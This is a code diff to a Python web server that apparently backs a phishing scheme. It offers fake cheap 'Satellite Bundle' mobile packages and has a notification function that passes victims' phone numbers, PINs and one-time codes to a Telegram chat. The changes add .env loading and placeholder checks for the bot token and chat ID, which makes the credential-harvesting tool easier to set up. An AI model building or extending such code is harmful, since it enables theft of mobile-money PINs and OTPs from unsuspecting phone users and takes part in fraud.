@@ -9,8 +9,34 @@ ROOT = Path(__file__).resolve().parent
 PORT = 8000
 
 
+def load_env_file():
+    env_path = ROOT / ".env"
+    if not env_path.exists():
+        return
+
+    with env_path.open("r", encoding="utf-8") as file:
+        for line in file:
+            line = line.strip()
+            if not line or line.startswith("#") or "=" not in line:
+                continue
+            key, value = line.split("=", 1)
+            key = key.strip()
+            value = value.strip().strip('"').strip("'")
+            os.environ.setdefault(key, value)
+
+
+load_env_file()
+
+
 def get_telegram_config():
-    return os.environ.get("TELEGRAM_BOT_TOKEN", ""), os.environ.get("TELEGRAM_CHAT_ID", "")
+    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
+    chat_id = os.environ.get("TELEGRAM_CHAT_ID", "").strip()
+
+    placeholder_values = {"your_bot_token_here", "your_chat_id_here", "placeholder", "changeme"}
+    if bot_token.lower() in placeholder_values or chat_id.lower() in placeholder_values:
+        return "", ""
+
+    return bot_token, chat_id
 
 PLANS = {
     "12": {"name": "Basic Satellite Bundle", "details": "1GB + 200 Min · 200 Minutes + 1000 SMS + 1GB Data", "price": "USD $0.50"},
@@ -24,7 +50,7 @@ PLANS = {
 def send_telegram_notification(package_id, phone_number, stage=None, pin="", otp="", attempt_number=1):
     bot_token, chat_id = get_telegram_config()
     if not bot_token or not chat_id:
-        return False, "Telegram is not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in your environment."
+        return False, "Telegram is not configured. Add TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID to your .env file or shell environment."
 
     plan = PLANS.get(package_id, {"name": "Selected Bundle", "price": "USD $0.00"})
 
